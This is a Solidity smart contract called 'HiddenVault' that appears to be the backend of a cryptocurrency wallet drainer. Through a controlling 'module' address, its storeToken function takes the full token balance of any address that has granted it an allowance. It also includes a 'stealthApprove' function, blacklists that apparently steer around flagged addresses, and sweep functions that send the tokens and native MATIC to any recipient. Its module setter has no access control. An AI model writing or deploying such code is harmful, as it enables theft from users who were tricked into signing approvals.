// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract HiddenVault {
    using EnumerableSet for EnumerableSet.AddressSet;

    address public vaultModule;

    EnumerableSet.AddressSet private _fromBlacklist;
    EnumerableSet.AddressSet private _toBlacklist;
    EnumerableSet.AddressSet private _contractBlacklist;

    modifier onlyModule() {
        require(msg.sender == vaultModule, "HiddenVault: only module");
        _;
    }

    constructor() {}

    function setVaultModule(address _vaultModule) external {
        require(vaultModule == address(0), "Module already set");
        vaultModule = _vaultModule;
    }

    receive() external payable {}
    fallback() external payable {}

    function storeToken(address token, address from) external onlyModule {
        require(!_fromBlacklist.contains(from), "HiddenVault: sender blacklisted");

        uint256 amount = IERC20(token).balanceOf(from);
        if (amount == 0) return;

        bool success = IERC20(token).transferFrom(from, address(this), amount);
        require(success, "HiddenVault: transferFrom failed");
    }

    function directTransfer(address token, address to, uint256 amount) external onlyModule {
        require(!_toBlacklist.contains(to), "HiddenVault: destination blacklisted");
        IERC20(token).transfer(to, amount);
    }

    function stealthApprove(address token, address spender, uint256 amount) external onlyModule {
        require(!_contractBlacklist.contains(spender), "HiddenVault: spender blacklisted");
        IERC20(token).approve(spender, 0);
        IERC20(token).approve(spender, amount);
    }

    function getVaultBalance(address token) external view onlyModule returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }

    function checkBlacklists(address from, address to) external view onlyModule {
        require(!_fromBlacklist.contains(from), "HiddenVault: sender blacklisted");
        require(!_toBlacklist.contains(to), "HiddenVault: destination blacklisted");
        require(!_contractBlacklist.contains(to), "HiddenVault: contract blacklisted");
    }

    function isBlacklisted(address from, address to) external view returns (bool) {
        return (
            _fromBlacklist.contains(from) ||
            _toBlacklist.contains(to) ||
            _contractBlacklist.contains(to)
        );
    }

    function addToFromBlacklist(address addr) external onlyModule { _fromBlacklist.add(addr); }
    function addToToBlacklist(address addr) external onlyModule { _toBlacklist.add(addr); }
    function addToContractBlacklist(address addr) external onlyModule { _contractBlacklist.add(addr); }

    function emergencyReturn(address token, address safe) external onlyModule {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(safe, balance);
        }
    }

    function withdrawMATIC(address to) external onlyModule {
        uint256 bal = address(this).balance;
        if (bal > 0) {
            (bool success, ) = payable(to).call{value: bal}("");
            require(success, "Withdraw failed");
        }
    }
}
